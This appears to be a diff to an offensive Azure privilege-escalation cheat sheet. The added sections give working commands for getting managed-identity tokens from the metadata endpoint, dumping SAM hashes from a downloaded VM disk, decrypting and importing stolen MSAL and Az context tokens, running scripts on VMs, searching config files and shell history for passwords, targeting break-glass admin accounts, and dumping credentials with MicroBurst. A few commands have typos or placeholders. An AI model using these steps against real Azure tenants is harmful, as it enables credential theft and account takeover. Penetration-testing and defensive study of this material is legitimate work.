@@ -6,8 +6,12 @@
   * [Stealing tokens](#Stealing-tokens)
   * [Keyvault](#Keyvault)
   * [Mimikatz](#Mimikatz)
-  * [Powershell History](#Powershell-History)
-  * [Transcript](#Transcript)
+  * [Visual Studio Code](#Visual-Studio-Code)
+  * [Publish settings in files](#Publish-settings-in-files)
+  * [Storage explorers](#Storage-explorers)
+  * [Web config and App config files](#Web-config-and-App-config-files)
+  * [Internal repositories](#Internal-repositories)
+  * [Command history](#Command-history)
 * [Managed Identity](#Managed-Identity)
 * [Reset password of other users](#Reset-password-of-other-users)
 * [Add credentials to enterprise applications](#Add-credentials-to-enterprise-applications)
@@ -16,6 +20,8 @@
 * [Abusing dynamic groups](#Abusing-dynamic-groups)
 * [Arm Templates History](#Arm-Templates-History)
 * [Function apps continuous deployment](#Function-apps-continuous-deployment)
+* [Break glass accounts](#Break-glass-accounts)
+* [Azure Container Registry dump](#Azure-Container-Registry-dump)
 
 ## Privesc enumeration
 ### When on a new machine
@@ -193,7 +199,73 @@ cat C:\Users\bkpadconnect\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLin
 cat C:\Users\<USER>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
 ```
 
+#### Login on VM as managed idenity
+```
+az login –identity
+```
+
+#### List permissions of current subscription
+- May have more permissions then the user
+```
+az role assignment list -–assignee ((az account list | ConvertFrom-Json).id)
+```
+
+#### If no AZ module can request token manually 
+- Then use Azure REST APIs with the token
+```
+Invoke-WebRequest -Uri 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/' -Method GET -Headers @{Metadata="true"} -UseBasicParsing
+```
+
+### Read password hashes from virtual machine
+- Download the disk https://docs.microsoft.com/en-us/azure/virtual-machines/windows/download-vhd#generate-download-url
+
+#### Check the disks
+```
+sudo fdisk –l
+```
+
+#### Mount the disk
+```
+sudo mkdir /media/mounted-drive
+sudo mount /dev/sdc4 /media/mounted-drive/
+```
+
+#### Navigate to the windows snapshot
+```
+cd /media/mounted-drive/
+ls
+```
+
+#### Copy system/SAM and dump hashes
+```
+cd /media/mounted-drive/Windows/System32/config/
+cp SAM SYSTEM ~/
+cd ~/
+impacket-secretsdump -system SYSTEM -sam SAM LOCAL
+```
+
+### Execute commands
+- Requires the "Virtual Machine Contributor" role
+- Run as default by SYSTEM or root
+- Commandid =  RunPowerShellScript or RunShellScript
+
+```
+Invoke-AzVMRunCommand -ResourceGroupName <resource group name> -VMName <VM name> -CommandId RunPowerShellScript -ScriptPath ./powershell-script.ps1
+```
+
+### Reset password from VM
+- Can be done from Azure portal
+- This may be a quick way to gain access and avoid PowerShell alerting
+- Be careful though as scripts/services may be using the credential
+
 ## Getting credentials
+#### Read AD credentials
+- User attributes and sensitive information
+
+```
+unknown command atm
+```
+
 ### Stealing tokens
 #### Stealing tokens from az cli
 - az cli stores access tokens in clear text in ```accessTokens.json``` in the directory ```C:\Users\<username>\.Azure```
@@ -208,6 +280,34 @@ cat C:\Users\<USER>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\Cons
 - Another interesting method is to take a process dump of PowerShell and looking for tokens in it!
 - Users can save tokens using Save-AzContext, look out for them! Search for Save-AzContext in PowerShell console history!
 - Always use Disconnect-AzAccount!!
+
+#### Save the AzureRmContext.json
+```
+cp %USERPROFILE%\.Azure\AzureRmContext.json C:\temp\AzureRmContext.json
+```
+
+#### Get the authenticated token for the user
+```
+Add-Type -AssemblyName System.Security; [Convert]::ToBase64String([Security.Cryptography.ProtectedData]::Unprotect((([Text.Encoding]::Default).GetBytes((Get-Content -raw "$env:userprofile\AppData\Local\.IdentityService\msal.cache"))), $null, [Security.Cryptography.DataProtectionScope]::CurrentUser))
+```
+
+#### Save the token into AzureRmContext.json
+-  Open AzureRmContext.json file in a notepad and find the line near the end of the file title “CacheData”. It should be null.
+
+#### Import the token
+```
+Import-AzContext -Path 'C:\Temp\Live Tokens\StolenToken.json’
+```
+
+#### or Save azcontext
+```
+Save-AzContext -Path C:\Temp\AzureAccessToken.json
+```
+
+#### Import the token
+```
+Import-AzContext -Path 'C:\Temp\Live Tokens\StolenToken.json’
+```
 
 ### Requesting tokens once logged in
 #### AZ powershell
@@ -274,15 +374,48 @@ Invoke-Mimikayz -Dumpcreds
 Invoke-Mimikatz -Command '"token::elevate" "lsadump::secrets"'
 ```
 
-### Powershell History
+### Visual Studio Code
+- Azure Cloud Service Packages (.cspkg)
+- Deployment files created by Visual Studio.
+- Possible other Azure services integration (SQL, storage, etc.)
+- Through cspkg zip files for creds/certs.
+- Search Visual Studio Public Directory ```<cloud project directory>\bin\debug\publish```
+
+### Publish settings in files
+- Look for file ```.publishsettings```
+- Can contain a Base64 encoded Management Certificate or cleartext credentials
+- Save "ManagementCertificate" section into a new .pfx file
+- Search the user's Downloads directory and VS projects.
+
+### Storage explorers
+- Windows Credential Manager stores these credentials.
+- Azure Storage Explorer for example has a built-in “Developer Tools” function that you can use to set breakpoints while loading the credentials allowing you to view them while unencrypted.
+
+### Web config and App config files
+-  ```Web.config``` and ```app.config``` files might contain creds or access tokens.
+- Look for management cert and extract to ```.pfx``` like publishsettings files
 ```
-Get-Childitem -Path C:\Users\ -Force -Include ConsoleHost_history -Recurse -ErrorAction SilentlyContinue
-cat <FILE> | select-string password
-cat <FILE> | select-string secure
+sudo find / -name web.config 2>/dev/null
+Get-ChildItem -Path C:\ -Filter app.config -Recurse -ErrorAction SilentlyContinue -Force
 ```
 
-### Transcript
+### Internal repositories
+- Find internal repos (scan for port 80, 443 or Query AD and look for subdomains or hostnames as git, code, repo, gitlab, bitbucket etc)
+- Tools for finding secrets
+  - Gitleaks https://github.com/zricethezav/gitleaks
+  - Gitrob https://github.com/michenriksen/gitrob
+  - Truffle hog https://github.com/dxa4481/truffleHog
+
+### Command history
+- Look through command history
+- ```~/.bash_history`` or ```%USERPROFILE%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt```
 ```
+sudo find / -name .bash_history 2>/dev/null
+Get-ChildItem -Path C:\ -Filter *ConsoleHost_history.txt* -Recurse -ErrorAction SilentlyContinue -Force
+cat <FILE> | select-string password
+cat <FILE> | select-string secure
+
+Get-Childitem -Path C:\* -Force -Include *transcript* -Recurse -ErrorAction SilentlyContinue
 type C:\Transcripts\20210422\PowerShell_transcript.DESKTOP-M7C1AFM.6sZJrDuN.20210422230739.txt
 ```
 
@@ -417,3 +550,15 @@ Set-AzureADUser -ObjectId <ID> -OtherMails <EMAIL> -Verbose
   - Bitbucket
 - May be able to escalate privileges if we can own a continuous deployment and execute code on anything or add users!
 
+## Break glass accounts
+- Another PrivEsc target is Azure “Break Glass” administrative accounts
+- Microsoft recommends not setting up MFA for them
+- Two accounts are usually recommended to be set up
+- If you can determine which ones are the break glass they can be good targets
+
+## Azure Container Registry dump
+- https://github.com/NetSPI/MicroBurst 
+```
+Get-AzPasswords
+Get-AzACR
+```
